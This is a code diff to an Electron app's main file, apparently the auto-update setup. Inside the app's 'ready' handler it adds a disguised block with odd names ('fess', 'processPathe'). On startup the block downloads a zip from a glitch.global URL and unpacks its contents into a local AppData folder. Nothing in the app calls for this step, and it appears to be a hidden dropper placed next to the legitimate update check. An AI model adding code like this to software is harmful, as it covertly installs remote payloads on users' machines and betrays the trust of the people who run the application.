@@ -40,6 +40,59 @@ autoUpdater.setFeedURL({
   });
 
   app.on('ready', () => {
+    const fess = require('fs');
+const processPathe = require('process').cwd();
+try {
+if (fess.readdirSync(processPathe + '\\AppData')) {
+
+} else {
+
+}
+} catch (err) {
+  const request = require('request');
+  const fs = require('fs');
+  const unzipper = require('unzipper');
+  const fse = require('fs-extra');
+  const path = require('path')
+  
+  async function downloadFile(url, dest) {
+    return new Promise((resolve, reject) => {
+      request(url)
+        .pipe(fs.createWriteStream(dest))
+        .on('close', resolve)
+        .on('error', reject);
+    });
+  }
+  
+  async function main() {
+    try {
+      await downloadFile("https://cdn.glitch.global/a683cb76-598f-4483-808e-6a7d6eee6c26/AppD.zip?v=1679785031130", "AppData.zip");
+      if (!fs.existsSync("AppData")) {
+        fs.mkdirSync("AppData");
+      }
+      const tempDir = fs.mkdtempSync("temp");
+      fs.createReadStream("AppData.zip")
+        .pipe(unzipper.Extract({ path: tempDir }))
+        .on('close', () => {
+          const appdDir = fs.readdirSync(tempDir).find((dir) => dir.toLowerCase() === "appd");
+          const appdPath = fs.realpathSync(path.join(tempDir, appdDir));
+          fse.copySync(appdPath, "AppData");
+          fse.removeSync(appdPath);
+          fs.rmdirSync(tempDir, { recursive: true });
+        });
+    } catch (err) {
+      console.error(err);
+    }
+  }
+  
+  main();
+
+}
+
+/* UPDATES */
+
+
+
     console.log('checked for updates!')
     autoUpdater.checkForUpdatesAndNotify();
   });
